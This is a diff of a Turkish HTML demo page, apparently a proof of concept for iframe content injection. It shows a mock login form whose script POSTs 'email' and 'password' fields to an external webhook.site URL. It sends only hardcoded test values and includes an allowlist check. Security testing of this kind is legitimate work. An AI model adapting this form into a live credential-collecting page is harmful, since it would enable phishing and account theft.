@@ -1,49 +1,87 @@
 <!doctype html>
-<html lang="tr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
-<title>Demo Giriş | Güvenlik Testi</title>
+<meta name="referrer" content="no-referrer">
+<title>Güvenlik Testi - Etkileşimli Demo</title>
 <style>
-*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:20px;background:#f0f5ff;color:#17243e;font:16px system-ui,sans-serif}
-main{background:white;border:1px solid #dfe6f1;border-radius:20px;padding:32px;width:min(100%,470px);box-shadow:0 20px 60px #132a4a17}
-small{color:#2259b6;font-weight:800;text-transform:uppercase;letter-spacing:.08em}h1{margin:12px 0;font-size:29px}
-p{line-height:1.55;color:#5e6b80}.field{margin:20px 0}label{display:block;font-size:13px;font-weight:700;margin-bottom:7px}
-input{width:100%;border:1px solid #b9c9df;border-radius:10px;padding:14px;font:inherit;outline:none}
-input:focus{border-color:#3062c5;box-shadow:0 0 0 3px #3062c522}
-button{padding:14px;width:100%;background:#245ad4;color:#fff;border:0;border-radius:10px;font:inherit;font-weight:700;cursor:pointer}
-.notice{padding:14px;background:#eef4ff;color:#29518f;border-radius:10px;font-size:12px}
-#status{padding:12px;background:#e7f7ed;color:#1a683b;border-radius:10px;display:none;font-size:13px}
-footer{margin-top:20px;font-size:12px;color:#687789;overflow-wrap:anywhere}
-</style></head>
-<body><main>
-<small>Yetkili test · Zararsız PoC</small><h1>Demo giriş ekranı</h1>
-<p>Bu örnek, harici bir sitenin iframe içinde nasıl gösterilebildiğini kanıtlamak için hazırlanmıştır.</p>
-<form id="demo" autocomplete="off">
-<div class="field"><label for="mail">Demo e-posta</label><input id="mail" type="email" placeholder="test@example.com" value="test@example.com" required></div>
-<div class="field"><label for="pass">Demo şifre</label><input id="pass" type="password" placeholder="Yalnızca sahte/test şifresi" required></div>
-<button type="submit">Demo giriş işlemini göster</button>
+:root{font-family:Inter,system-ui,-apple-system,"Segoe UI",sans-serif;color:#19293d;background:#f5f8fe}
+*{box-sizing:border-box}body{margin:0;padding:26px 18px;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at 15% 10%,#dce8ff,transparent 40%),#f7f9fe}
+main{width:min(100%,475px);border:1px solid #dbe3f3;box-shadow:0 22px 55px #18325c20;background:#fff;border-radius:20px;padding:30px}
+.banner{font-size:11px;font-weight:800;letter-spacing:.09em;color:#235bbd;background:#eef5ff;padding:10px 12px;border-radius:9px;text-align:center}
+h1{font-size:28px;margin:24px 0 8px;letter-spacing:-.035em}p{line-height:1.55}.sub{font-size:14px;color:#5f7189;margin:0 0 22px}
+.field{margin:0 0 15px}label{display:block;font-weight:650;font-size:13px;margin:0 0 7px}
+input{display:block;width:100%;font:inherit;padding:13px 14px;border:1px solid #c9d5e5;border-radius:10px;color:#1c3050;outline:none}
+input:focus{border-color:#2763dd;box-shadow:0 0 0 3px #2763dd22}
+.explain{margin:4px 0 0;color:#66758c;font-size:11px}
+button{width:100%;background:#255cd4;color:#fff;font:inherit;font-weight:750;border:0;border-radius:11px;padding:14px;margin-top:8px;cursor:pointer}
+button:hover{background:#174ebf}button:disabled{opacity:.75;cursor:progress}
+.safety{margin-top:18px;background:#f1f6fd;border-left:4px solid #2d64cb;border-radius:8px;padding:12px;font-size:12px;color:#35506f;line-height:1.5}
+.status{margin-top:14px;padding:12px;border-radius:8px;background:#e8f9ee;color:#176235;font-size:13px;line-height:1.45;display:none}
+.status.show{display:block}.foot{color:#74839b;font-size:11px;margin:16px 0 0}
+code{font-size:12px;overflow-wrap:anywhere}
+</style>
+</head>
+<body>
+<main>
+<div class="banner">GÜVENLİK ARAŞTIRMASI — SAHTE VERİLERLE POC</div>
+<h1>Demo giriş ekranı</h1>
+<p class="sub">Bu sayfa üçüncü taraf iframe içerik enjeksiyonunu görselleştirmek için tasarlanmış bir güvenlik testidir.</p>
+<form id="demoForm" autocomplete="off">
+<div class="field"><label for="demoEmail">Demo e-posta</label>
+<input type="email" id="demoEmail" name="display-email" placeholder="test@test.com" autocomplete="off" spellcheck="false" required>
+<div class="explain">Test için yalnızca <code>test@test.com</code> kullanın.</div></div>
+<div class="field"><label for="demoPassword">Demo şifre</label>
+<input type="password" id="demoPassword" name="display-password" placeholder="test12" autocomplete="off" required>
+<div class="explain">Test için yalnızca <code>test12</code> kullanın.</div></div>
+<button id="submit" type="submit">Demo testi kaydet</button>
 </form>
-<p class="notice"><b>Önemli:</b> Gerçek hesap bilgisi girmeyin. Yazdığınız bilgiler sunucuya veya webhook'a aktarılmaz; yalnızca sabit bir demo olayı gönderilir.</p>
-<p id="status" role="status"></p>
-<footer>Kaynak: <span id="origin"></span><br>Bağlam: <span id="context"></span><br>Gerçek kimlik doğrulaması yapılmaz.</footer>
+<div class="safety"><strong>Güvenli demo:</strong> Bu ekran gerçek oturum açma yapmaz. Yalnızca iki sabit test değeri kabul edilir. Webhook'a yalnızca <code>email</code> ve <code>password</code> alanlarıyla önceden tanımlanmış sahte test bilgileri gönderilir. Gerçek kişisel bilgi girmeyin.</div>
+<div class="status" id="status" role="status" aria-live="polite"></div>
+<p class="foot">Origin: <code id="origin"></code> · Bağlam: <span id="context"></span></p>
 </main>
 <script>
 "use strict";
-document.querySelector("#origin").textContent=location.origin;
-document.querySelector("#context").textContent=(self===top?"Doğrudan açıldı":"iframe içerisinde");
-document.querySelector("#demo").addEventListener("submit",async(e)=>{
-  e.preventDefault();
-  const status=document.querySelector("#status");
-  status.style.display="block";
-  status.textContent="Demo tamamlandı. Yalnızca sabit test olayı gönderiliyor...";
-  document.querySelector("#pass").value="";
-  const payload={event:"FRAME_INJECTION_DEMO_SUBMITTED",mode:"SAFE_POC",credentials_sent:false};
-  try {
-    await fetch("https://webhook.site/b8798469-3d3c-4107-8b00-281fe65716fe",{
-      method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:JSON.stringify(payload)
-    });
-    status.textContent="Sabit test olayı gönderme denendi. Alındığını Webhook.site panelinden doğrulayın. E-posta/şifre gönderilmedi.";
-  }catch(err){
-    status.textContent="Demo tamamlandı, fakat test olayı gönderilemedi. E-posta/şifre gönderilmedi.";
-  }
+const WEBHOOK_URL="https://webhook.site/b8798469-3d3c-4107-8b00-281fe65716fe";
+const DEMO_EMAIL="test@test.com";
+const DEMO_PASSWORD="test12";
+document.getElementById("origin").textContent=location.origin;
+document.getElementById("context").textContent=self===top?"üst sayfa":"iframe";
+const frm=document.getElementById("demoForm");
+const status=document.getElementById("status");
+const button=document.getElementById("submit");
+frm.addEventListener("submit",async ev=>{
+ ev.preventDefault();
+ // Strict allowlist: other values never trigger a network request.
+ const allowedEmail=document.getElementById("demoEmail").value.trim()===DEMO_EMAIL;
+ const allowedPassword=document.getElementById("demoPassword").value===DEMO_PASSWORD;
+ if(!allowedEmail || !allowedPassword){
+  status.textContent="Yalnızca ekranda belirtilen sabit demo e-posta ve şifresiyle test yapabilirsiniz. Hiçbir veri gönderilmedi.";
+  status.classList.add("show");
+  document.getElementById("demoPassword").value="";
+  return;
+ }
+ // IMPORTANT: Use hardcoded inert demo strings, never submit form field contents.
+ const payload={email:DEMO_EMAIL,password:DEMO_PASSWORD};
+ button.disabled=true;
+ status.textContent="Yalnızca sabit, hayali test bilgileri gönderiliyor. Gerçek hesap verisi gönderilmiyor.";
+ status.classList.add("show");
+ try{
+  await fetch(WEBHOOK_URL,{
+    method:"POST",mode:"no-cors",cache:"no-store",
+    headers:{"Content-Type":"text/plain;charset=UTF-8"},
+    body:JSON.stringify(payload)
+  });
+  status.textContent="Sabit demo bilgileriyle test isteği başlatıldı. Webhook.site üzerinde yalnızca email ve password alanlarını kontrol edin. no-cors nedeniyle teslimat yanıtı buradan doğrulanamaz.";
+ }catch(e){
+  status.textContent="Bağlantı hatası: test isteği gönderilemedi.";
+ }finally{
+  document.getElementById("demoPassword").value="";
+  button.disabled=false;
+ }
 });
-</script></body></html>
+</script>
+</body>
+</html>
